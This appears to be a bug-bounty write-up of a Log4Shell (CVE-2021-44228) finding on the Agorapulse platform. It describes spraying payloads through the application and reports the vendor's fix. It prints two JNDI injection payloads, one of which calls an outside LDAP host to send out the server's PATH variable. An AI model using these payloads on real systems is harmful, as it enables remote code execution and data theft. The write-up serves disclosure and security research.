# LOG4J on Agorapulse



## What is agorapulse:

Agorapulse provides an organization system to stay organized ,save time, better manage your team, your subscription and all the social profiles you added.
Agorapulse basically provides everything an organization  could possibly need for social media marketing and monitoring and management.focusing on social media platforms like facebook,linkedin and twitter,agorapulse provides a comprehensive and a compact platform for companies for their marketing strategies while also keeping it under the budget radar.The software is used to create & schedule social media content, engage audiences, listen for key terms, and analyze social media performance.

## What is Log4j
 
Log4j is a logging framework for Java applications. It is a popular choice for developers looking for a simple and flexible logging solution. However, Log4j has been found to be vulnerable to a number of security threats.The biggest concern with Log4j is that it can be used to expose sensitive information and  allows unauthenticated remote code execution. For example, if an attacker can inject malicious code into a Log4j logging statement, they can view passwords, session IDs, and other sensitive data or can execute any arbitrary commands on the vulnerable server.

For more information on Log4j security, see the following resources:
- OWASP Log4j Cheat Sheet
- Log4j Vulnerabilities and Exposures
- Secure Log4j Usage

Log4j vulnerability is a critical vulnerability, affecting Apache Log4j 2 versions 2.0 to 2.14.1, as identified by Chen Zhaojun of the Alibaba Cloud Security Team. NIST published a critical CVE in the National Vulnerability Database on December 10th, 2021, naming this as CVE-2021–44228. Apache Software Foundation assigned the maximum CVSS severity rating of 10.

This disclosure came storming into the security industry and a havoc was created because all companies implementing this vulnerable framework were exploitable by this critical vulnerability. One can get an idea from the analytics published by hackerone which say , “Hackers have submitted over 2,000 Log4Shell reports to over 400 of our customers. The majority of reports were made in the first 14 days after the public disclosure of Log4 Shell" . Almost the same number of reports were submitted on bugcrowd as well with over _300 reports_ submitted in a single day.


## How we found log4js on agorapulse:

It was the middle of winter of 2021 when the news of log4j vulnerability broke out in the cyber security industry. And as the norm goes, it got all the security researchers on their heels. As the clock was ticking our company decided to focus wholly on exploiting this vulnerability.
Our company had many targets to focus on and scan for this vulnerability. So the options were open. One of those available targets was agorapulse. Due to its dynamic nature and multiple functionality it was a preferable target  for our company. 
So now the target was chosen , we plunged into research mode and figured out how we were going to scan for this vulnerability. We identified features and functionalities where we could use our payloads.

As the application was pretty vast with multiple features, we had to stay organized. We used a simple and comprehensive approach of pasting payloads everywhere in the application and as said above to keep things organized we used numeric numbering to identify the triggered payloads. 

{{examples of identifiable payloads}}


On the other hand we also played it safe, using a payload that was not at all harmful to the client i,e did not result in any denial of service attack or executing any malicious code inside the application. The purpose of the payload was just to give us a pingback so the place of vulnerability could be identified. So we devised the following safe payload to identify the dns pingbacks : ${jndi:ldap://<Your-Burp-Collab-URL>/a} .

So now the identification process began and after a while we received two pingbacks. One of the received was a false pingback. But next up we had a dns pingback that identified the log4js vulnerability in that framework.



## Demonstration of Impact


As mentioned in earlier sections the successful exploitation could lead to RCE. We refrained from doing any such action which could lead to any kind of issues to the vulnerable server or the service. So, we just checked for the DNS pingback from the vulnerable server with our payload. When the victim server logs the request using log4j, then log4j interpolates the string and queries malicious Ldap server and then LDAp server responds with malicious Java class.
The contents of log messages often contain user-controlled data, attackers can insert JNDI references pointing to LDAP servers they control, ready to serve malicious Java classes that perform any action they choose.

In the payload we could use  any arbitrary command that could be executed on the server but in this case we used the following payload just to extract the environment variables of the server.

Payload : ${jndi:ldap://54.147.33.250:1389/${env:PATH}}

{{screenshot}}

We stopped right after extracting the path variables of the vulnerable server just to keep the exploitation ethical.

## Response of Agora Team

Submitting the report to the agora team, we got their first response in a day. They were responsive and concerned with the security of their online assets. They fixed the bug in a couple of days and rewarded our finding.

After their fix was implemented we  tried various payloads and bypasses to conform if the fix was working well. But we were unable to bypass the fix and it was working fine and we confirmed the fix.
